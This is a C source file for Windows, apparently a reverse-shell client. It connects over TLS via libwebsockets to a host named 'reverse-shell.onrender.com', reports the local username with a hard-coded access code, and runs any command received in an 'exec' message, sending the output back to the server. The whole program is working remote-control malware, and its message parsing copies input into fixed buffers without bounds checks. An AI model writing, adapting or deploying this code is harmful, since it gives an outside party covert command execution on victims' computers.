#include <libwebsockets.h>
#include <string.h>
#include <signal.h>
#include <windows.h>
#include <lmcons.h>

int sentId = 0;

static int interrupted = 0;

static void sigint_handler(int sig) {
    interrupted = 1;
}

// Function to dynamically escape special characters in a JSON string
char *escape_json(const char *input) {
    size_t input_len = strlen(input);
    // Allocate buffer for output, assuming worst case where every char needs escaping
    size_t max_output_len = input_len * 2 + 1;  // +1 for null terminator
    char *escaped = (char *)malloc(max_output_len);
    if (!escaped) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

    size_t j = 0;  // Index for the escaped string
    for (size_t i = 0; i < input_len; i++) {
        switch (input[i]) {
            case '\\':  // Backslash
                escaped[j++] = '\\';
                escaped[j++] = '\\';
                break;
            case '"':   // Double quotes
                escaped[j++] = '\\';
                escaped[j++] = '"';
                break;
            case '\b':  // Backspace
                escaped[j++] = '\\';
                escaped[j++] = 'b';
                break;
            case '\f':  // Form feed
                escaped[j++] = '\\';
                escaped[j++] = 'f';
                break;
            case '\n':  // Newline
                escaped[j++] = '\\';
                escaped[j++] = 'n';
                break;
            case '\r':  // Carriage return
                escaped[j++] = '\\';
                escaped[j++] = 'r';
                break;
            case '\t':  // Tab
                escaped[j++] = '\\';
                escaped[j++] = 't';
                break;
            default:
                // Copy any other character as is
                escaped[j++] = input[i];
                break;
        }
    }
    escaped[j] = '\0';  // Null-terminate the escaped string

    return escaped;  // Caller must free the memory allocated
}

// Function to send a message
void send_message(struct lws *wsi, const char *value) {

    // Create the JSON message dynamically with the escaped value
    char json_msg[512];
    snprintf(json_msg, sizeof(json_msg), "%s", value);

    size_t msg_len = strlen(json_msg);
    unsigned char buf[LWS_PRE + 512];
    memcpy(&buf[LWS_PRE], json_msg, msg_len);

    int bytes_sent = lws_write(wsi, &buf[LWS_PRE], msg_len, LWS_WRITE_TEXT);
    if (bytes_sent < (int)msg_len) {
        fprintf(stderr, "Failed to send message completely\n");
    } else {
        printf("Sent message: %s\n", json_msg);
    }
}

void execute(const char *command, struct lws *wsi) {
    char buffer[128];
    FILE *fp = _popen(command, "r");
    if (fp == NULL) {
        printf("Failed to run command\n");
        return;
    }

    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        char msg[256];

        // Escape the value to handle any special characters
        char *escaped_value = escape_json(buffer);
        if (!escaped_value) {
            return;  // Handle memory allocation failure
        }

        snprintf(msg, sizeof(msg), "{ \"type\": \"cmd\", \"value\": \"%s\", \"to\": \"web\" }", escaped_value);
        send_message(wsi, msg);

        free(escaped_value);
    }

    _pclose(fp);
    // q: why does it quit without running the command?
    // a: the command is not being sent to the server
    // q: why is the command not being sent to the server?

}

void handle_message(const char *json_data, struct lws *wsi) {
    char type[16] = {0};  // Buffer for "type" value
    char value[64] = {0}; // Buffer for "value" value

    // Find the "type" key and extract the value
    const char *type_start = strstr(json_data, "\"type\":\"");
    if (type_start) {
        type_start += 8; // Move pointer past "\"type\":\""
        const char *type_end = strchr(type_start, '"');
        if (type_end) {
            size_t type_len = type_end - type_start;
            strncpy(type, type_start, type_len);
            type[type_len] = '\0'; // Null-terminate the string
        }
    }

    // Find the "value" key and extract the value
    const char *value_start = strstr(json_data, "\"value\":\"");
    if (value_start) {
        value_start += 9; // Move pointer past "\"value\":\""
        const char *value_end = strchr(value_start, '"');
        if (value_end) {
            size_t value_len = value_end - value_start;
            strncpy(value, value_start, value_len);
            value[value_len] = '\0'; // Null-terminate the string
        }
    }

    // Switch based on the "type" field
    if (strcmp(type, "msg") == 0) {
        printf("Received message: %s\n", value);
        // Handle "msg" type
    } else if (strcmp(type, "exec") == 0) {
        printf("Received exec: %s\n", value);
        // Handle "exec" type
        execute(value, wsi);
    } else {
        printf("Unknown type: %s\n", type);
    }
}

static int callback_echo(struct lws *wsi, enum lws_callback_reasons reason,
                         void *user, void *in, size_t len) {
    switch (reason) {
        case LWS_CALLBACK_CLIENT_ESTABLISHED:
            printf("Connected to server\n");
            lws_callback_on_writable(wsi); // Keep writable to send pings
            break;

        case LWS_CALLBACK_CLIENT_WRITEABLE: {
            if(!sentId){
                char username[UNLEN+1];
                DWORD username_len = UNLEN+1;
                GetUserName(username, &username_len);
                char msg[128];

                snprintf(msg, sizeof(msg), "{ \"type\": \"id\", \"value\": \"%s\", \"accessCode\": \"tvojemama\" }", username);

                unsigned char buf[LWS_PRE + 128];
                size_t n = snprintf((char *)&buf[LWS_PRE], sizeof(buf) - LWS_PRE, "%s", msg);
                send_message(wsi, msg);
                sentId = 1;
            }

            lws_callback_on_writable(wsi);
            break;
        }

        case LWS_CALLBACK_CLIENT_RECEIVE:
            printf("Received: %s\n", (const char *)in);
            handle_message((const char *)in, wsi);
            // Keep connection writable to avoid closing
            lws_callback_on_writable(wsi);
            break;

        case LWS_CALLBACK_CLIENT_CONNECTION_ERROR:
            printf("Connection error\n");
            interrupted = 1;
            break;

        case LWS_CALLBACK_CLIENT_CLOSED:
            printf("Disconnected from server\n");
            interrupted = 1;
            break;

        default:
            break;
    }
    return 0;
}

int main() {
    struct lws_context_creation_info info;
    struct lws_client_connect_info ccinfo;
    struct lws_context *context;
    const char *url = "reverse-shell.onrender.com";
    int port = 443;

    memset(&info, 0, sizeof info);
    info.port = CONTEXT_PORT_NO_LISTEN;
    info.options = LWS_SERVER_OPTION_DO_SSL_GLOBAL_INIT;
    info.protocols = (struct lws_protocols[]) {
        {"chat", callback_echo, 0, 0},
        {NULL, NULL, 0, 0}
    };

    // Enable debug logging
    lws_set_log_level(LLL_USER | LLL_ERR | LLL_WARN | LLL_NOTICE | LLL_INFO | LLL_DEBUG, NULL);

    context = lws_create_context(&info);
    if (!context) {
        fprintf(stderr, "lws init failed\n");
        return 1;
    }

    memset(&ccinfo, 0, sizeof(ccinfo));
    ccinfo.context = context;
    ccinfo.address = url;
    ccinfo.port = port;
    ccinfo.path = "/";
    ccinfo.host = url;
    ccinfo.origin = url;
    ccinfo.protocol = "chat";
    ccinfo.ssl_connection = LCCSCF_USE_SSL; // Enable SSL/TLS
    ccinfo.pwsi = NULL;

    signal(SIGINT, sigint_handler);

    if (!lws_client_connect_via_info(&ccinfo)) {
        fprintf(stderr, "SSL Connection failed\n");
        lws_context_destroy(context);
        return 1;
    }

    while (!interrupted) {
        lws_service(context, 1000);
    }

    lws_context_destroy(context);
    return 0;
}
